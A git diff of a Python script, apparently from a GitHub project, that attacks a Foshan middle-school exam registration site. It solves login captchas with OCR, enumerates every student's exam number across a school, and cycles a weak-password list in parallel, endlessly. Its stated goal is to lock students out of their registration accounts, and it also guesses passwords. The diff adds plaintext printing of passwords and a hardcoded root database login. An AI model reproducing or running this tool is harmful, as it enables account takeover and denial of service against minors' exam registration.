@@ -1,7 +1,7 @@
 '''
 Author: whalefall
 Date: 2021-03-20 16:37:34
-LastEditTime: 2021-04-03 11:45:22
+LastEditTime: 2021-04-03 16:41:00
 Description: 中考报名网站
 '''
 import base64
@@ -27,6 +27,7 @@ import requests
 from lxml import etree
 from PIL import Image
 import traceback
+import pymysql
 
 
 class Encrypt:
@@ -122,7 +123,7 @@ class Zkweb:
 
             # image = self.delete_spot()
             # image = self.convert_Image()
-            image = self.dispose_code() # 效果最好的方案
+            image = self.dispose_code()  # 效果最好的方案
 
             code = pytesseract.image_to_string(image)
             # 去掉非法字符，只保留字母数字
@@ -233,7 +234,7 @@ class Zkweb:
                     else:
                         pixdata[x, y] = 255
             return img
-            
+
         img = binarizing(img, 225)
         """传入二值化后的图片进行降噪"""
         pixdata = img.load()
@@ -295,7 +296,7 @@ class Zkweb:
         # 可能账号密码不存在之类的
         elif "[规则]登录失败！" in resp.text:
 
-            print("登录受限!")
+            print("%s登录受限!" % (userid))
             self.count += 1
             if self.count >= 10:
                 print("账户(%s)可能被限制超过10次 请换ip" % (userid))
@@ -304,7 +305,7 @@ class Zkweb:
             return False
 
         elif "登录失败，请核对您的用户名和密码！" in resp.text:
-            print("账号密码有误!")
+            print("账号(%s)密码(%s)有误!" % (userid, pwd))
             return "PwdError"
 
         elif "账号已被锁定，请在5分钟后进行尝试。" in resp.text:
@@ -353,9 +354,12 @@ class Zkweb:
             print("主页:%s 下载成功!" % (index_return[1]))
 
         else:
-            # print("")
-            pass
+            with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "html//%s.html" % ("Error解析错误{}".format(random.randint(1,9999)))), mode="w", encoding="utf8") as f:
 
+                f.write(resp.text)
+
+            print("主页解析错误 但已下载 主页:%s 下载成功!" % ("Error解析错误"))
+            
     # 解析主页 内部方法
 
     def __indexRE(self, html):
@@ -378,6 +382,27 @@ class Zkweb:
         except Exception as e:
             print("[Error]HTML解析失败!", e)
             return (False,)
+
+
+# mysql
+# INSERT INTO users (id,time) VALUES (123,'test');
+def writeMsq(id, time):
+
+    try:
+        # 打开数据库连接
+        conn = pymysql.connect(
+            host="192.168.101.4", user="root", passwd="123456", port=3306, database="fszk")
+        # 获取游标
+        cursor = conn.cursor()
+        sql1 = "INSERT INTO users (id,time) VALUES (%s,%s)"
+        cursor.execute(sql1, (id, time))
+        # 一定要提交更改
+        cursor.connection.commit()
+    except Exception as u:
+        print("数据库写入失败!", u)
+
+# writeMsq(111,"Ss")
+# sys.exit()
 
 # 获取配置文件
 
@@ -417,16 +442,27 @@ def getConfig():
 
 
 # 主函数
-def main(userid, pwd):
+def main(userid, pwd=None, _status=0):
 
     # 在循环外实例化对象 保留count计数器
 
     bot = Zkweb()
+    if pwd != None:
+        _status = 1
 
     try:
-        i = 0
+        i = 0  # 单用户请求次数计数
+        PwdList = ["@a123456", "@abc123456", "@Aa123456",
+                   "@abc666666", "@qq123456", "@Aa66666"]  # 弱密码列表
+
         while True:
             i += 1
+
+            if _status != 1:
+                pwd = random.choice(PwdList)
+            else:
+                pass
+
             print("----------------%s第%s次请求----------------" % (userid, i))
             code = bot.checkCode()
             # 验证码识别有误时 跳出本次循环 减少对登录接口的请求次数
@@ -443,35 +479,32 @@ def main(userid, pwd):
                 break
 
             elif loginStatus == "Locking":
+                t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                 print('''
-################################
-#    时间:%s
-#    账号:%s 成功被锁定!
-################################
-                ''' % (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), userid))
-
-# 锁定成功后的操作
-
-#                 with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "result.txt"), mode="a") as txt:
-#                     txt.write('''
-# ################################
-# #    时间:%s
-# #    账号:%s 成功被锁定!
-# ################################
-#                     ''' % (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), userid))
+                ################################
+                #    时间:%s
+                #    账号:%s 成功被锁定!
+                ################################
+                ''' % (t, userid))
+                # writeMsq(int(userid), str(t))
 
                 return "Suc"
-
-                # break
 
             elif loginStatus == "apiError":
                 print("接口错误!")
                 # time.sleep(10)
                 break
 
+            # 密码错误 --继续运行下去,并删除失败的密码
             elif loginStatus == "PwdError":
-                # print("")
-                continue
+
+                if _status == 1:
+                    print("给定密码错误!")
+                    break
+
+                else:
+                    PwdList.remove(pwd)
+                    continue
 
             # 规则[登录失败!]
             elif loginStatus == "resqError":
@@ -498,12 +531,12 @@ def main(userid, pwd):
 # %s
 ##################################        
         ''' % (userid, traceback.format_exc()))
-        
+
 
 if __name__ == "__main__":
 
     print('''
-    ###############佛山中考报名网站##########################################
+    ##########################佛山中考报名网站###############################
     # GitHub:https://github.com/AdminWhaleFall/FsZkWeb
     ########################################################################
     # 1. 修改config.ini为你想锁定的账号
@@ -515,45 +548,42 @@ if __name__ == "__main__":
 
     # time.sleep(2)
 
-    try:
-        UserList, checkTime = getConfig()
-    except Exception as e:
-        print("[Config]配置文件有误!请检查后重试", traceback.format_exc())
-        sys.exit()
+    # try:
+    #     UserList, checkTime = getConfig()
+    # except Exception as e:
+    #     print("[Config]配置文件有误!请检查后重试", traceback.format_exc())
+    #     sys.exit()
 
-    i = 0
-    # 不间断循环
-    while True:
+    # i = 0
+    # # 不间断循环
+    # while True:
 
-        # print("----------------------第%s次循环遍历!----------------------------" % (i))
+    #     # print("----------------------第%s次循环遍历!----------------------------" % (i))
 
-        for userID in UserList:
-            result = main("2106051508%04d" % (userID), "@A123456")
+    #     for userID in UserList:
+    #         result = main("2106051508%04d" % (userID), "@A123456")
 
-            if result == "Suc":
-                # 成功就删除账号
-                UserList.remove(userID)
-                print(userID, "已删除!")
-                print("剩余用户:%s" % (UserList))
+    #         if result == "Suc":
+    #             # 成功就删除账号
+    #             UserList.remove(userID)
+    #             print(userID, "已删除!")
+    #             print("剩余用户:%s" % (UserList))
 
-        if UserList == []:
-            i += 1
-            print("--------------第%s次循环遍历!已完成歇息中----------" % (i))
+    #     if UserList == []:
+    #         i += 1
+    #         print("--------------第%s次循环遍历!已完成歇息中----------" % (i))
 
-            # 间接实现热重载
+    #         # 间接实现热重载
 
-            UserList, checkTime = getConfig()
+    #         UserList, checkTime = getConfig()
 
-            time.sleep(checkTime)
-
-
-
+    #         time.sleep(checkTime)
 
     # 报废代码
     # 构造考号:2106051508|0613
 
-    ''' 测试单次请求
-    # userid = "21060515080101"
+    # 测试单次请求
+    # userid = "21060515080809"
     # pwd = "@lov23456"
     # bot = Zkweb()
     # code = bot.checkCode()
@@ -561,28 +591,28 @@ if __name__ == "__main__":
 
     # if code == False:
     #     print("验证码识别(登陆前)错误!")
-    '''
+    # main(userid)
 
-
-    
-    ''' 多进程部分
+    # 多进程部分
     import multiprocessing
     pool = multiprocessing.Pool(processes=5)
 
     # 通过遍历得到全校考号
 
-    for classId in range(1, 12):
-        for i in range(1, 52):
+    while True:
+        for classId in range(1, 12):
+            for i in range(1, 52):
 
-            # 女朋友的班级学号 不要搞她
-            if i == 13 and classId == 6:
-                continue
+                # 女朋友的班级学号 不要搞她
+                if i == 13 and classId == 6:
+                    pool.apply_async(func=main, args=(
+                        "2106051508%02d%02d" % (classId, i), "@lovehyy123456",))
 
-            pool.apply_async(func=main, args=(
-                "2106051508%02d%02d" % (classId, i), "@A123456",))
+                pool.apply_async(func=main, args=(
+                    "2106051508%02d%02d" % (classId, i),))
 
-            # main("2106051508%02d%02d" % (classId, i), "@A123456")
+                # main("2106051508%02d%02d" % (classId, i), "@A123456")
 
-    pool.close()
-    pool.join()
-    '''
+        
+        
+        
